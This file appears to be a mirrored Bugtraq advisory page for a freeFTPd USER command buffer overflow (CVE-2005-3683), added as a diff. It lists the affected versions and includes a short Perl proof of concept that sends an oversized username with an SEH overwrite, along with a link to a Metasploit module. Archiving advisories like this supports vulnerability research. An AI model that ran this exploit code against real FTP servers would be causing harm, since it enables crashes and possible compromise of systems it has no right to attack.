@@ -1,0 +1,124 @@
+#SpeeDr00t@Black Falcon<br>#bid15457<p><b><span style="font-size: 18pt;">FreeFTPD User Command Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/15457/info">info</a><br><a href="http://www.securityfocus.com/bid/15457/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/15457/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/15457/solution">solution</a><br><a href="http://www.securityfocus.com/bid/15457/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				15457
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2005-3683<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 16 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Aug 24 2006 07:19PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				barabas mutsonline &lt;barbsie@gmail.com&gt; is credited with the discovery of this vulnerability.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					freeFTPd freeFTPd 1.0.8 <br/>
+					
+				
+					freeFTPd freeFTPd 1.0.7 <br/>
+					
+				
+					freeFTPd freeFTPd 1.0.6 <br/>
+					
+				
+					freeFTPd freeFTPd 1.0.5 <br/>
+					
+				
+					freeFTPd freeFTPd 1.0.4 <br/>
+					
+				
+					freeFTPd freeFTPd 1.0.3 <br/>
+					
+				
+					freeFTPd freeFTPd 1.0.2 <br/>
+					
+				
+					freeFTPd freeFTPd 1.0.1 <br/>
+					
+				
+					freeFTPd freeFTPd 1.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					freeFTPd freeFTPd 1.0.10 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x16000/15457/freeftpd_user.pm">#exploit_freeftpd_user.pm</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept is available:<br/>#!/usr/bin/perl -w<br/>#freeftpd USER buffer overflow<br/>#barabas - 2005<br/><br/>use strict;<br/>use Net::FTP;<br/>my $user="\x41"x1011;<br/>$user .="\x44\x45\x46\x47";#overwrite SEH<br/>$user .="\x50"x400;<br/><br/>my $ftp = Net::FTP-&gt;new("www.example.com &lt;http://www.example.com&gt;", Debug =&gt; 1);<br/>$ftp-&gt;login("$user","whatevah");<br/><br/>An exploit for the Metasploit Framework has been released.
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/freeftpd_user.pm">/data/vulnerabilities/exploits/freeftpd_user.pm</a></li>
+</ul>
+</div>
